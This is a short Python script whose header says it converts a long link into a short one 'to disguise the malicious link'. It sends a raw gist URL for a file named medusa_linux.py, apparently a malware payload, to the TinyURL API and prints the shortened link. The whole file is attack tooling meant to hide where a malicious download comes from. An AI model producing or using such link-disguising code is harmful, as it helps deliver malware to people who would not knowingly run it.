'''
 # @ Create Time: 2025-05-09 10:10:00
 # @ Modified time: 2025-05-09 10:10:06
 # @ Description: convert long link into a short link to disguise the malicious link
 '''

import requests

long_url = "https://gist.githubusercontent.com/Wapiti08/d2866a3d212e8f3a127ac86e30e87dc7/raw/1e5e1ca3525c2a4b1ed1d9f0603f6a4a39425ca0/medusa_linux.py"
api_url = "http://tinyurl.com/api-create.php"

response = requests.get(api_url, params={"url": long_url})
if response.status_code == 200:
    short_url = response.text
    print("Shortened URL:", short_url)

else:
    print("Failed to shorten the URL. Status code:", response.status_code)


